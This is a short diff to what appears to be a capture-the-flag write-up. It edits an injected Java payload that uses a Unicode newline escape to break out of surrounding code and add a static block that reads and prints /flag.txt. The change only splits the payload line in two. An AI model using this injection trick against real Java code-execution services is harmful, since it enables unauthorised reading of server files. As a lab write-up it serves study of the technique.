@@ -32,5 +32,6 @@ public class Main {
 Inject a static block to read and print `/flag.txt`:  
 
 ```java
-\u000a static { try { java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader("/flag.txt")); System.out.println(br.readLine()); } catch (Exception e) { } }
+\u000a static { try { java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader("/flag.txt"));
+System.out.println(br.readLine()); } catch (Exception e) { } }
 ```
